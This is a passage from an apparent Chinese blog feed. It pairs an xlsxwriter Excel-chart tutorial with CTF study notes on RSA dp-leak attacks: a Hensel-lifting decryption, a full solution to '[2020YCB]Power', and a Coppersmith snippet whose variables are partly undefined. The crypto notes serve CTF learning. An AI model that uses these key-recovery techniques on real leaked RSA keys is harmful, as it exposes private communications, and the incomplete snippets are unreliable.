class="number">2</span>,<span class="number">30</span>)</span><br><span class="line">worksheet1.set_column(<span class="string">&#x27;D:F&#x27;</span>,<span class="number">40</span>)</span><br><span class="line">workbook.close()</span><br></pre></td></tr></table></figure>

<h3 id="设置标签颜色"><a href="#设置标签颜色" class="headerlink" title="设置标签颜色"></a>设置标签颜色</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">worksheet1.set_tab_color(<span class="string">&#x27;#0000FF&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="插入图片"><a href="#插入图片" class="headerlink" title="插入图片"></a>插入图片</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding=gbk</span></span><br><span class="line"><span class="keyword">import</span> xlsxwriter</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 一：创建工作簿</span></span><br><span class="line">workbook = xlsxwriter.Workbook(<span class="string">&#x27;test.xlsx&#x27;</span>)<span class="comment">#创建一个excel文件</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 二：创建工作表</span></span><br><span class="line">worksheet1 = workbook.add_worksheet(<span class="string">&#x27;test-sheet1&#x27;</span>)<span class="comment">#在文件中创建一个名为test-sheet1的sheet,不加名字默认为sheet1</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># # 设置行宽</span></span><br><span class="line"><span class="comment"># worksheet1.set_row(0,60)</span></span><br><span class="line"><span class="comment"># # 设置列宽</span></span><br><span class="line"><span class="comment"># worksheet1.set_column(1,2,30)</span></span><br><span class="line"><span class="comment"># worksheet1.set_column(&#x27;D:F&#x27;,40)</span></span><br><span class="line"><span class="comment"># worksheet1.set_tab_color(&#x27;#0000FF&#x27;)</span></span><br><span class="line"> </span><br><span class="line">worksheet1.insert_image(<span class="string">&#x27;A3&#x27;</span>, <span class="string">&#x27;00.jpg&#x27;</span>, &#123;<span class="string">&#x27;url&#x27;</span>: <span class="string">&#x27;https://blog.csdn.net/&#x27;</span>&#125;)</span><br><span class="line">workbook.close()</span><br></pre></td></tr></table></figure>

<h1 id="插入图表"><a href="#插入图表" class="headerlink" title="插入图表"></a>插入图表</h1><blockquote>
<p>chart类实图表组件，支持包括面积、条形图、柱状图、折线图、散点图等，一个图表对象是通过Workbook的add_chart方法创建，通过<code>&#123;type, &#39;图表类型&#39;&#125;</code>字典来制定图表类型,常见的图表样式如下：</p>
<ul>
<li>area：面积样式的图表</li>
<li>bar：条形图</li>
<li>column：柱状图</li>
<li>line：线条样式的图表</li>
<li>pie：饼形图</li>
<li>scatter：散点图</li>
<li>stock：股票样式的图表</li>
<li>radar：雷达样式的图表</li>
</ul>
</blockquote>
<h2 id="创建chart类"><a href="#创建chart类" class="headerlink" title="创建chart类"></a>创建chart类</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1:创建chart对象</span></span><br><span class="line">chart = workbook.add_chart(&#123;<span class="string">&#x27;type&#x27;</span>:<span class="string">&#x27;line&#x27;</span>&#125;)</span><br><span class="line"><span class="comment"># 2：设置chart对象相关数据，属性</span></span><br><span class="line"><span class="comment"># 3：然后通过Worksheet的insert_chart()方法插入到指定位置</span></span><br><span class="line">worksheet1.insert_chart(<span class="string">&#x27;A3&#x27;</span>,chart,&#123;<span class="string">&#x27;x_offset&#x27;</span>:<span class="number">25</span>,<span class="string">&#x27;y_offset&#x27;</span>:<span class="number">10</span>&#125;)   <span class="comment">#放置图表位置</span></span><br></pre></td></tr></table></figure>

<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><h3 id="添加数据"><a href="#添加数据" class="headerlink" title="添加数据"></a>添加数据</h3><blockquote>
<p>以字典类型添加数据。</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">chart.add_series(&#123;</span><br><span class="line">     <span class="string">&#x27;categories&#x27;</span>: <span class="string">&#x27;=Sheet1!$A$1:$A$5&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;values&#x27;</span>: <span class="string">&#x27;=Sheet1!$B$1:$B$5&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;line&#x27;</span>: &#123;<span class="string">&#x27;color&#x27;</span>: <span class="string">&#x27;red&#x27;</span>&#125;,</span><br><span class="line"> &#125;) </span><br></pre></td></tr></table></figure>


<h3 id="设置x轴以及y轴"><a href="#设置x轴以及y轴" class="headerlink" title="设置x轴以及y轴"></a>设置x轴以及y轴</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">chart.set_x_axis(&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;x name&#x27;</span>,</span><br><span class="line">                  <span class="string">&#x27;name_font&#x27;</span>: &#123;<span class="string">&#x27;size&#x27;</span>: <span class="number">14</span>, <span class="string">&#x27;bold&#x27;</span>: <span class="literal">True</span>&#125; ,</span><br><span class="line">                  <span class="string">&#x27;num_font&#x27;</span>: &#123;<span class="string">&#x27;italic&#x27;</span>: <span class="literal">True</span>&#125;</span><br><span class="line">                  &#125;)</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">name：设置x轴名称；</span></span><br><span class="line"><span class="string">name_font：设置x轴字体；</span></span><br><span class="line"><span class="string">num_font：设置x轴数字字体属性；</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="其他方法"><a href="#其他方法" class="headerlink" title="其他方法"></a>其他方法</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># set_size(options)方法，用于设置图表大小，示例如下：</span></span><br><span class="line">chart.set_size(&#123;<span class="string">&#x27;width&#x27;</span>: <span class="number">720</span>, <span class="string">&#x27;height&#x27;</span>: <span class="number">576</span>&#125;)</span><br><span class="line"><span class="comment"># width：设置宽度；</span></span><br><span class="line"><span class="comment"># height：设置高度；</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># set_title(options)方法，设置图表标题，示例如下：</span></span><br><span class="line">chart.set_title(&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;test&#x27;</span>&#125;)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># set_style(style_id)方法，用于设置图表样式，style_id为不同数字代表不同样式</span></span><br><span class="line">chart.set_style(<span class="number">37</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># set_table(options)方法，设置x轴为数据表格式。</span></span><br><span class="line">chart.set_table()</span><br></pre></td></tr></table></figure>

<h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding=gbk</span></span><br><span class="line"><span class="keyword">import</span> xlsxwriter</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 一：创建工作簿</span></span><br><span class="line">workbook = xlsxwriter.Workbook(<span class="string">&#x27;test.xlsx&#x27;</span>)<span class="comment">#创建一个excel文件</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 二：创建工作表</span></span><br><span class="line">worksheet1 = workbook.add_worksheet(<span class="string">&#x27;test-sheet1&#x27;</span>)<span class="comment">#在文件中创建一个名为test-sheet1的sheet,不加名字默认为sheet1</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 三：数据准备</span></span><br><span class="line">row_data=[<span class="string">&#x27;姓名&#x27;</span>,<span class="string">&#x27;数学&#x27;</span>,<span class="string">&#x27;英语&#x27;</span>,<span class="string">&#x27;语文&#x27;</span>]</span><br><span class="line">col_data = [</span><br><span class="line">    [<span class="string">&#x27;张三&#x27;</span>,<span class="string">&#x27;李四&#x27;</span>,<span class="string">&#x27;老王&#x27;</span>,<span class="string">&#x27;德华&#x27;</span>,<span class="string">&#x27;赵四&#x27;</span>],</span><br><span class="line">    [<span class="number">90</span>, <span class="number">85</span>, <span class="number">120</span>, <span class="number">130</span>, <span class="number">99</span>],</span><br><span class="line">    [<span class="number">70</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">109</span>, <span class="number">110</span>],</span><br><span class="line">    [<span class="number">60</span>, <span class="number">95</span>, <span class="number">130</span>, <span class="number">120</span>, <span class="number">79</span>]</span><br><span class="line">]</span><br><span class="line"> </span><br><span class="line">worksheet1.write_row(<span class="string">&#x27;A1&#x27;</span>,row_data)</span><br><span class="line">worksheet1.write_column(<span class="string">&#x27;A2&#x27;</span>,col_data[<span class="number">0</span>])</span><br><span class="line">worksheet1.write_column(<span class="string">&#x27;B2&#x27;</span>,col_data[<span class="number">1</span>])</span><br><span class="line">worksheet1.write_column(<span class="string">&#x27;C2&#x27;</span>,col_data[<span class="number">2</span>])</span><br><span class="line">worksheet1.write_column(<span class="string">&#x27;D2&#x27;</span>,col_data[<span class="number">3</span>])</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 四：创建chart对象</span></span><br><span class="line">chart = workbook.add_chart(&#123;<span class="string">&#x27;type&#x27;</span>:<span class="string">&#x27;line&#x27;</span>&#125;)        <span class="comment"># 线条样式的图表</span></span><br><span class="line"><span class="comment"># chart = workbook.add_chart(&#123;&#x27;type&#x27;:&#x27;column&#x27;&#125;)      # 柱状图</span></span><br><span class="line"><span class="comment"># chart = workbook.add_chart(&#123;&#x27;type&#x27;:&#x27;area&#x27;&#125;)       # 面积样式的图表</span></span><br><span class="line"><span class="comment"># chart = workbook.add_chart(&#123;&#x27;type&#x27;:&#x27;stock&#x27;&#125;)      # 股票样式的图表</span></span><br><span class="line"><span class="comment"># chart = workbook.add_chart(&#123;&#x27;type&#x27;:&#x27;bar&#x27;&#125;)        # 条形图</span></span><br><span class="line"><span class="comment"># chart = workbook.add_chart(&#123;&#x27;type&#x27;:&#x27;pie&#x27;&#125;)        # 饼形图</span></span><br><span class="line"><span class="comment"># chart = workbook.add_chart(&#123;&#x27;type&#x27;:&#x27;scatter&#x27;&#125;)    # 散点图</span></span><br><span class="line"><span class="comment"># chart = workbook.add_chart(&#123;&#x27;type&#x27;:&#x27;radar&#x27;&#125;)      # 雷达样式的图表</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">chart.add_series(&#123;</span><br><span class="line">    <span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;=test-sheet1!$B$1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;categories&#x27;</span>: <span class="string">&#x27;=test-sheet1!$A$2:$A$6&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;values&#x27;</span>: <span class="string">&#x27;=test-sheet1!$B$2:$B$6&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;line&#x27;</span>: &#123;<span class="string">&#x27;color&#x27;</span>: <span class="string">&#x27;red&#x27;</span>&#125;,</span><br><span class="line">    <span class="string">&#x27;pie&#x27;</span>: &#123;<span class="string">&#x27;color&#x27;</span>: <span class="string">&#x27;red&#x27;</span>&#125;,</span><br><span class="line">&#125;)</span><br><span class="line"> </span><br><span class="line">chart.add_series(&#123;</span><br><span class="line">    <span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;=test-sheet1!$C$1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;categories&#x27;</span>: <span class="string">&#x27;=test-sheet1!$A$2:$A$6&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;values&#x27;</span>: <span class="string">&#x27;=test-sheet1!$C$2:$C$6&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;line&#x27;</span>: &#123;<span class="string">&#x27;color&#x27;</span>: <span class="string">&#x27;yellow&#x27;</span>&#125;,</span><br><span class="line">    <span class="string">&#x27;pie&#x27;</span>: &#123;<span class="string">&#x27;color&#x27;</span>: <span class="string">&#x27;yellow&#x27;</span>&#125;,</span><br><span class="line">&#125;)</span><br><span class="line"> </span><br><span class="line">chart.add_series(&#123;</span><br><span class="line">    <span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;=test-sheet1!$D$1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;categories&#x27;</span>: <span class="string">&#x27;=test-sheet1!$A$2:$A$6&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;values&#x27;</span>: <span class="string">&#x27;=test-sheet1!$D$2:$D$6&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;line&#x27;</span>: &#123;<span class="string">&#x27;color&#x27;</span>: <span class="string">&#x27;blue&#x27;</span>&#125;,</span><br><span class="line">    <span class="string">&#x27;pie&#x27;</span>: &#123;<span class="string">&#x27;color&#x27;</span>: <span class="string">&#x27;blue&#x27;</span>&#125;,</span><br><span class="line">&#125;)</span><br><span class="line"> </span><br><span class="line">chart.set_title(&#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;测试&#x27;</span>&#125;)</span><br><span class="line">chart.set_x_axis(&#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&quot;x轴&quot;</span>&#125;)</span><br><span class="line">chart.set_y_axis(&#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;y轴&#x27;</span>&#125;)          <span class="comment">#设置图表表头及坐标轴</span></span><br><span class="line"> </span><br><span class="line">chart.set_style(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># chart.set_style(37)</span></span><br><span class="line"> </span><br><span class="line">worksheet1.insert_chart(<span class="string">&#x27;B8&#x27;</span>,chart,&#123;<span class="string">&#x27;x_offset&#x27;</span>:<span class="number">25</span>,<span class="string">&#x27;y_offset&#x27;</span>:<span class="number">10</span>&#125;)   <span class="comment">#放置图表位置</span></span><br><span class="line"> </span><br><span class="line">workbook.close()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">官方文档：https://xlsxwriter.readthedocs.io/chart.html</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>xlsx</tag>
      </tags>
  </entry>
  <entry>
    <title>WeeklyStudy</title>
    <url>/2023/12/31/WeeklyStudy/</url>
    <content><![CDATA[<p>2023摸鱼笔记哈哈哈哈。</p>
<span id="more"></span><!--toc-->

<h1 id="230201"><a href="#230201" class="headerlink" title="230201"></a>230201</h1><h2 id="dp泄露以及一些扩展"><a href="#dp泄露以及一些扩展" class="headerlink" title="dp泄露以及一些扩展"></a>dp泄露以及一些扩展</h2><h3 id="n-e-dp-c"><a href="#n-e-dp-c" class="headerlink" title="n, e, dp, c"></a>n, e, dp, c</h3><p>即基础$dp$，需要进行一定推导，主要以推导＋爆破的思想，对n进行分解，从而得到$p$, $q$。</p>
<h3 id="变种1：-n-x3D-p-b-cdot-q"><a href="#变种1：-n-x3D-p-b-cdot-q" class="headerlink" title="变种1：$n &#x3D; p^{b} \cdot q$"></a>变种1：$n &#x3D; p^{b} \cdot q$</h3><img src="/2023/12/31/WeeklyStudy/hense_lifting.png" class="" title="hensel lifting">

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">dp_hensel</span>(<span class="params">c, e, dp, p, b</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    :param b: p^b*q</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    mp_ = <span class="built_in">pow</span>(c, dp, p)</span><br><span class="line">    mp = <span class="built_in">pow</span>(c, dp - <span class="number">1</span>, p)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, b - <span class="number">2</span>):</span><br><span class="line">        x = <span class="built_in">pow</span>(c - <span class="built_in">pow</span>(mp_, e), <span class="number">1</span>, p**(i + <span class="number">1</span>))</span><br><span class="line">        y = <span class="built_in">pow</span>(x * mp * invert(e, p), <span class="number">1</span>, p**(i + <span class="number">1</span>))</span><br><span class="line">        mp_ = mp_ + y</span><br><span class="line">    <span class="keyword">return</span> mp_</span><br></pre></td></tr></table></figure>

<h4 id="2020YCB-Power"><a href="#2020YCB-Power" class="headerlink" title="[2020YCB]Power"></a>[2020YCB]Power</h4><p>关于十进制位数与二进制位数。</p>
<p>感觉十进制的不会太容易比较，还是直接比较二进制的相对来说会比较准确一点。二进制的话主要利用<code>bit_length()</code>函数。<br>$$<br>d\times e \equiv 1 \mod phi \equiv 1\mod (p-1)<br>$$</p>
<p>$$<br>dp \equiv d \mod (p-1)<br>$$</p>
<p>$$<br>k \times ( p - 1 ) &#x3D; dp \times e - 1<br>$$</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># num = dp * e - 1</span></span><br><span class="line"><span class="comment"># num.bit_length() 为 526</span></span><br><span class="line"><span class="comment"># yafu对num进行分解，从而得到因子</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">factor:</span></span><br><span class="line"><span class="string">P1 = 2 # 1 digits</span></span><br><span class="line"><span class="string">P1 = 2</span></span><br><span class="line"><span class="string">P1 = 2</span></span><br><span class="line"><span class="string">P2 = 11 # 2</span></span><br><span class="line"><span class="string">P4 = 7411 # 4</span></span><br><span class="line"><span class="string">P14 = 10402958442703 # 14</span></span><br><span class="line"><span class="string">P17 = 25388174482857437 # 17</span></span><br><span class="line"><span class="string">P23 = 19976951634728916570101 # 23</span></span><br><span class="line"><span class="string">P33 = 121098273308863403811867260913043 # 33</span></span><br><span class="line"><span class="string">P69 = 514664028984426592785192432611128951474323755859087258008037664208623 # 69</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># 利用范围框定p值，经过试验得：</span></span><br><span class="line">p = num // <span class="number">7411</span> // <span class="number">2</span> // <span class="number">2</span> + <span class="number">1</span></span><br><span class="line"><span class="comment"># print(p.bit_length())</span></span><br><span class="line"><span class="comment"># 512</span></span><br><span class="line"><span class="comment"># 判定条件</span></span><br><span class="line"><span class="comment"># 1. 数值长度是否512</span></span><br><span class="line"><span class="comment"># 2. 所得p是不是素数</span></span><br></pre></td></tr></table></figure>

<p>主要利用分解出来的factors，来进行试错，然后通过查看bit位数的函数，唯一的p给试出来。<br>$$<br>c \equiv m^{e} \mod n<br>$$</p>
<p>$$<br>dp \equiv d (\mod p-1)<br>$$</p>
<p>$$<br>\rightarrow c^{dp} \equiv m^{e\cdot dp} \mod n<br>$$</p>
<p>$$<br>\rightarrow c^{dp} \mod p \equiv m^{e \cdot dp} \mod p<br>$$</p>
<p>$$<br>d\cdot e \equiv 1 \mod lcm(p-1, q-1)<br>$$</p>
<p>$$<br>\rightarrow e\cdot dp \equiv d \cdot e \mod (p-1) \equiv 1 \mod (p-1)<br>$$</p>
<p>$$<br>\rightarrow k\cdot (p-1) &#x3D; e \cdot dp - 1<br>$$</p>
<p>$$<br>\exist k \in \mathbb{Z}, c^{dp}\mod p &#x3D; m^{k\cdot (p-1) + 1} \mod p<br>$$</p>
<p>费马定理可得$a^{p-1} \mod p \equiv 1$.<br>$$<br>\Longrightarrow m \cdot m^{k\cdot (p-1)} \mod p \equiv c^{dp} \mod p<br>$$</p>
<p>$$<br>\Longrightarrow m \equiv c^{dp} \mod p<br>$$</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Hensel lifting for Takagi’s scheme</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">dp = <span class="number">3272293505696712831419859641571956066667516012597886098021642320155056349966612629986261146617139998624603483170466852538289743936225789351270153550594329</span></span><br><span class="line">c = <span class="number">22524257534087703614496632403022329621384173069680778965750290698059674588465640878754707363673789674111671270645152584118206145007310499274423606886261969807360070526126452646719628307689968971699215841867636770320159256301550908771135042912287955209485328267670825390080110910391913063177323585204392804538642393453388536211144485389902591029350060800993352969569703901717308330574394200996651534321547814313195218895547718815009876393987398738932001924661338796059973950012706427109598830049455186171345179840564502215531573714428772608739268313985559628612004439028014417408631851880698512023740903181116906766066951473942201698375224240271523568161242951730224901227589413731025281719101368668617497947995579443908773425555177346524678673641140157885033923288401884</span></span><br><span class="line">c1 = <span class="number">290707924192892686920253390955676600323331633814839708838347288502692494699485764473635783441705302268064111648851157070038783719749721994682837294625334517914882191486257362565066745587415388291939979195637720350919055988532145531805200483161599965215275808797976727969023747299578173497083532351976473770041800769265319548352841139802163279116490053292316399038329210043455932786945180855178341998049756983301499491011851026499269682821602212971062877270127451987836730083380463825717889123804613394241190839837791281657872259492589868751745327696030438893865069941066073554427558697972551085353027574529823439588670263047287131740802375738439636789806332323994866753085014446479034974063195632514803340511247735647970572837053148490258113394359072976858781060349776921428492973183958437965966963122069107876143476772436757554253049619918403996315720023020827394900507088006299225934263699192253079026440287311664705744424959801981503191480257138833694306501816837037995549817186335377411638035575004595417788588264823861850877111374085336446477943372458378834664678094751978400910288151519902977326995118727880223621964441498323865158898463327323193833062919619201107279964663654606753750042791368210261574897455830722232022689695292080269205470491791950839486861811469879413313773338916781857981641910031441448964144000585506870170898052132929034349451945051362244755750988705018897859238859476967568556992146975789444151432386692872801263000639711599152191790766776280</span></span><br><span class="line">y = <span class="number">449703347709287328982446812318870158230369688625894307953604074502413258045265502496365998383562119915565080518077360839705004058211784369656486678307007348691991136610142919372779782779111507129101110674559235388392082113417306002050124215904803026894400155194275424834577942500150410440057660679460918645357376095613079720172148302097893734034788458122333816759162605888879531594217661921547293164281934920669935417080156833072528358511807757748554348615957977663784762124746554638152693469580761002437793837094101338408017407251986116589240523625340964025531357446706263871843489143068620501020284421781243879675292060268876353250854369189182926055204229002568224846436918153245720514450234433170717311083868591477186061896282790880850797471658321324127334704438430354844770131980049668516350774939625369909869906362174015628078258039638111064842324979997867746404806457329528690722757322373158670827203350590809390932986616805533168714686834174965211242863201076482127152571774960580915318022303418111346406295217571564155573765371519749325922145875128395909112254242027512400564855444101325427710643212690768272048881411988830011985059218048684311349415764441760364762942692722834850287985399559042457470942580456516395188637916303814055777357738894264037988945951468416861647204658893837753361851667573185920779272635885127149348845064478121843462789367112698673780005436144393573832498203659056909233757206537514290993810628872250841862059672570704733990716282248839</span></span><br><span class="line">g = <span class="number">2</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">b = <span class="number">4</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">p解法1</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># num = e * dp - 1</span></span><br><span class="line"><span class="comment"># p = (e * dp - 1) // 7411 // 2 // 2 + 1</span></span><br><span class="line"><span class="comment"># # print(p.bit_length())</span></span><br><span class="line"><span class="comment"># # print(is_prime(p))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># from sympy import *</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">p解法2</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># x = discrete_log(y, c1, 2)</span></span><br><span class="line"><span class="comment"># print(x)</span></span><br><span class="line"><span class="comment"># print(type(x))</span></span><br><span class="line"><span class="comment"># print(type(y))</span></span><br><span class="line">x = <span class="number">5535722692962580764045545539105119140941061679289569420988353884209653851308860058948669740693107863231179565602072744542122031789184119031739723962825082929025825322421201364211726001366490949760887367407718763255964735567971493859197583624076478457865073449246835949075135223468616834636386958924709024763349115622062848212445867198457630368236782421195503713107838541903829979118327675371550868768159024260793541264335548489228744367609071659968450303895118817379316060805148754136917043160175570565717388336822960389664337656603584425629662613786203920234401824957121860225422901340950436355650311392398098947210940</span></span><br><span class="line">p = var(<span class="string">&#x27;p&#x27;</span>)</span><br><span class="line">R.&lt;p&gt; = PolynomialRing(GF(y))</span><br><span class="line"><span class="comment"># R = PolynomialRing(GF(y), name = &#x27;p&#x27;)</span></span><br><span class="line">f = <span class="number">2019</span>*p**<span class="number">2</span> + <span class="number">2020</span>*p**<span class="number">3</span> + <span class="number">2021</span>*p**<span class="number">4</span> - x</span><br><span class="line"><span class="comment"># print(f)</span></span><br><span class="line">f.roots()</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">p解法3</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,e+<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">if</span> (dp*e-<span class="number">1</span>)%x==<span class="number">0</span>:</span><br><span class="line">        p=(dp*e-<span class="number">1</span>)//x+<span class="number">1</span></span><br><span class="line">        x = <span class="number">2019</span>*p**<span class="number">2</span> + <span class="number">2020</span>*p**<span class="number">3</span> + <span class="number">2021</span>*p**<span class="number">4</span></span><br><span class="line">        <span class="keyword">if</span> c1 == <span class="built_in">pow</span>(g, x, y):</span><br><span class="line">            <span class="built_in">print</span>(p)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dp_hensel</span>(<span class="params">c, e, dp, p, b</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    :param b: p^b*q</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    mp_ = <span class="built_in">pow</span>(c, dp, p)</span><br><span class="line">    mp = <span class="built_in">pow</span>(c, dp - <span class="number">1</span>, p)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, b - <span class="number">2</span>):</span><br><span class="line">        x = <span class="built_in">pow</span>(c - <span class="built_in">pow</span>(mp_, e), <span class="number">1</span>, p**(i + <span class="number">1</span>))</span><br><span class="line">        y = <span class="built_in">pow</span>(x * mp * invert(e, p), <span class="number">1</span>, p**(i + <span class="number">1</span>))</span><br><span class="line">        mp_ = mp_ + y</span><br><span class="line">    <span class="keyword">return</span> mp_</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">解法2：根据Hensel lifting for Takagi’s scheme算法进行解密</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line">m = <span class="built_in">int</span>(dp_hensel(c, e, dp, p, b))</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"></span><br><span class="line"><span class="comment"># &quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># 解法1：利用推导定位关键公式进行解密</span></span><br><span class="line"><span class="comment"># &quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># # m = pow(c, dp, p)</span></span><br><span class="line"><span class="comment"># # print(m)</span></span><br><span class="line"><span class="comment"># # print(long_to_bytes(m))</span></span><br></pre></td></tr></table></figure>

<h3 id="变种2：Coppersmith攻击，已知dp高位攻击"><a href="#变种2：Coppersmith攻击，已知dp高位攻击" class="headerlink" title="变种2：Coppersmith攻击，已知dp高位攻击"></a>变种2：Coppersmith攻击，已知dp高位攻击</h3><img src="/2023/12/31/WeeklyStudy/coppersmith-high.png" class="" title="coppersmith">

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Sage</span></span><br><span class="line">dp0 = </span><br><span class="line">e = </span><br><span class="line">n = </span><br><span class="line"></span><br><span class="line">F.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">d = inverse_mod(e, n)</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, e):</span><br><span class="line">	f = (secret &lt;&lt; <span class="number">200</span>) + x + (k - <span class="number">1</span>) * d <span class="comment"># 200 editable</span></span><br><span class="line">	x0 = f.small_roots(X=<span class="number">2</span> ** (<span class="number">200</span> + <span class="number">1</span>), beta=<span class="number">0.44</span>, epsilon=<span class="number">1</span>/<span class="number">32</span>)</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(x0) != <span class="number">0</span>:</span><br><span class="line">		dp = x0[<span class="number">0</span>] + (secret &lt;&lt; <span class="number">200</span>)</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, e):</span><br><span class="line">			p = (e * Integer(dp) - <span class="number">1</span> + i) // i</span><br><span class="line">			<span class="keyword">if</span> n % p == <span class="number">0</span>:</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">		<span class="keyword">if</span> p &lt; <span class="number">0</span>:</span><br><span class="line">			<span class="keyword">continue</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&#x27;k = &#x27;</span>,k)</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&#x27;p = &#x27;</span>,p)</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&#x27;dp = &#x27;</span>,dp)</span><br><span class="line">			<span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<h3 id="变种3：-p-x3D-gcd-m-e-cdot-dp-m-n"><a href="#变种3：-p-x3D-gcd-m-e-cdot-dp-m-n" class="headerlink" title="变种3：$p &#x3D; gcd(m^{e \cdot dp} - m, n)$"></a>变种3：$p &#x3D; gcd(m^{e \cdot dp} - m, n)$</h3><img src="/2023/12/31/WeeklyStudy/gcd.png" class="" title="extension">

<h3 id="TBC"><a href="#TBC" class="headerlink" title="TBC"></a>TBC</h3><p>还有很多变种，暂且不明白原理，先放着了。</p>
